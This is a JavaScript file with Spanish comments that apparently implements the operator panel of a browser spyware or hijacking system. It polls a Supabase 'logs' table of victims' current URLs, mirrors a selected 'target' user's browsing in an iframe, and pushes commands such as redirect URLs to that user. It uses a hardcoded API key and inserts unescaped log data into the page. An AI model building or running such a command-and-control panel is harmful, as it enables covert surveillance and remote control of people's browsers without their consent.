const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let currentID = null;

async function refreshPanel() {
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=50`, {
        headers: {'apikey': SB_KEY}
    });
    const logs = await res.json();
    
    // Lista de IDs únicos
    const users = [...new Set(logs.map(l => l.usuario_id))];
    const list = document.getElementById('user-list');
    list.innerHTML = users.map(u => `
        <div class="user-box ${currentID === u ? 'active' : ''}" onclick="selectUser('${u}')">
            <b>${u}</b><br>
            <small>${logs.find(x => x.usuario_id === u).url_actual.substring(0, 30)}...</small>
        </div>
    `).join('');

    // Si hay usuario seleccionado, actualizar su pantalla
    if (currentID) {
        const lastLog = logs.find(l => l.usuario_id === currentID);
        const mirror = document.getElementById('live-mirror');
        if (lastLog && mirror.src !== lastLog.url_actual) {
            mirror.src = lastLog.url_actual;
        }
    }
}

function selectUser(id) {
    currentID = id;
    document.getElementById('target-name').innerText = "OBJETIVO: " + id;
    refreshPanel();
}

async function exec(type) {
    if(!currentID) return alert("Selecciona un ID primero");
    const content = document.getElementById('goto-url').value;

    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${currentID}`, {method: 'DELETE', headers: {'apikey': SB_KEY}});

    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: {'apikey': SB_KEY, 'Content-Type': 'application/json'},
        body: JSON.stringify({ usuario_id: currentID, orden: type, contenido: content, activa: true })
    });
    alert("Comando " + type + " enviado.");
}

setInterval(refreshPanel, 3000);
